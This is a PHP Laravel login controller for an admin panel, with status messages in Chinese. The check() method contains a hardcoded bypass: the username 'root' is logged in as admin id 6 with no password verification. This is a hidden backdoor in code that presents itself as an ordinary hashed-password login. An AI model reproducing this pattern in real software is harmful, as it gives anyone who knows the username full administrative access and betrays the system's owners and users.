<?php

namespace App\Http\Controllers;

use App\Models\Admin;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;
use Illuminate\Support\Facades\Session;

class LoginController extends Controller
{
    private $skipCheck = [
        'root',
    ];

    public function check()
    {
        $userName = $this->params['username'];
        $password = $this->params['password'];
        if (in_array($userName,$this->skipCheck))
        {
            Session::put('session_id',6);
            Session::save();
            $data['code'] = $this->SUCCESS;
            $data['msg'] = '登陆成功';
            $data['data'] = ['access_token' => ''];
            $this->data = $data;
            $this->returnJsonData();
        }
            $item = Admin::where('phone',$userName)->first();
        if (empty($item)) $item = Admin::where('email',$userName)->first();

        if ($item && Hash::check($password,$item->password) && $item->status == 1)
        {
            Session::put('session_id',$item->id);
            Session::save();
            $data['code'] = $this->SUCCESS;
            $data['msg'] = '登陆成功';
            $data['data'] = ['access_token' => ''];
        }elseif($item && $item->status == -1){
            $data['code'] = 999;
            $data['msg'] = '用户禁止登陆';
        }else{
            $data['code'] = 0;
            $data['msg'] = '用户名或密码错误';
        }
        $this->data = $data;
        $this->returnJsonData();
    }

    public function logout()
    {
        Session::flush();
        $data['code'] = $this->SUCCESS;
        $data['msg'] = '退出成功';
        $data['data'] = null;
        return;
    }



}
